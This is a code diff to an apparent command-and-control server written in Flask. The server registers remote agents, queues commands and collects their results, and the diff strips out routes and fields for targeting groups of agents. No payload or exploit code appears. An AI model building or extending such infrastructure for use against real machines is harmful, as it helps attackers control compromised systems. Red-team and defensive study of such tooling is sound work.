@@ -58,7 +58,6 @@ class Agent(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     agent_id = db.Column(db.String(100), unique=True, nullable=False)
     status = db.Column(db.String(20), default='active')
-    targeted = db.Column(db.Boolean,default=False)
     last_seen = db.Column(db.DateTime, default=datetime.now(tz=timezone.utc))
     last_command = db.Column(db.String(5000), nullable=True,default="NULL")
     last_result = db.Column(db.Text, nullable=True,default="NULL")
@@ -75,7 +74,6 @@ class Task(db.Model):
     action = db.Column(db.String(5000), nullable=True,default="NULL")
     input1 = db.Column(db.String(5000), nullable=True,default="NULL")
     input2 = db.Column(db.String(5000), nullable=True,default="NULL")
-    destination = db.Column(db.String(1000), nullable=True,default="NULL")
     completed = db.Column(db.Boolean, default=False)
     result = db.Column(db.Text, nullable=True,default="NULL")
     returncode = db.Column(db.Integer, nullable=True,default=1234) # Default value to differentiate from actual return codes
@@ -226,7 +224,7 @@ def register_agent():
 def submit_results():
     try:
         # print(request.json)
-        print("Length",len(request.json['result']))
+        # print("Length",len(request.json['result']))
         data = request.json
         result = data['result']
         agent_id = data['agent_id']
@@ -358,56 +356,9 @@ def get_agent():
     if agent_id:
         agent = Agent.query.filter_by(agent_id=agent_id).first()
         if agent:
-            return jsonify({"status":agent.status,"targeted":agent.targeted,"last_seen":agent.last_seen,"last_command":agent.last_command,"last_result":agent.last_result,"callbacks":agent.callbacks}), 200
+            return jsonify({"status":agent.status,"last_seen":agent.last_seen,"last_command":agent.last_command,"last_result":agent.last_result,"callbacks":agent.callbacks}), 200
         return jsonify({"error": "Agent not found"}), 404
     return jsonify({"error": "Invalid data"}), 400
-
-#Targeting related routes: (used by skelctl and can be used by other management interfaces to issue commands to multiple agents at once)
-@app.route('/targets', methods=['GET'])
-@restrict_remote
-def get_targets():
-    targets = ""
-    agents = Agent.query.filter_by(targeted=True).all()
-    for agent in agents:
-        targets += agent.agent_id + "\n"
-    return targets
-
-@app.route('/set-targets', methods=['POST'])
-@restrict_remote
-def set_targets():
-    data = request.json
-    ips = data.get('ips')
-    if ips:
-        for ip in ips:
-            agent = Agent.query.filter_by(agent_id=ip).first()
-            if agent:
-                agent.targeted = True
-                db.session.commit()
-        return jsonify({"message": "Targets set successfully"}), 200
-    return jsonify({"error": "Invalid data"}), 400
-
-@app.route('/untarget', methods=['POST'])
-@restrict_remote
-def untarget():
-    data = request.json
-    ips = data.get('ips')
-    if ips: 
-        for ip in ips:
-            agent = Agent.query.filter_by(agent_id=ip).first()
-            if agent:
-                agent.targeted = False
-                db.session.commit()
-        return jsonify({"message": "Targets unset successfully"}), 200
-    return jsonify({"error": "Invalid data"}), 400
-
-@app.route('/clear-targets', methods=['POST'])
-@restrict_remote
-def clear_targets():
-    agents = Agent.query.filter_by(targeted=True).all()
-    for agent in agents:
-        agent.targeted = False
-    db.session.commit()
-    return jsonify({"message": "Targets cleared successfully"}), 200
 
 #Tagging related routes:
 
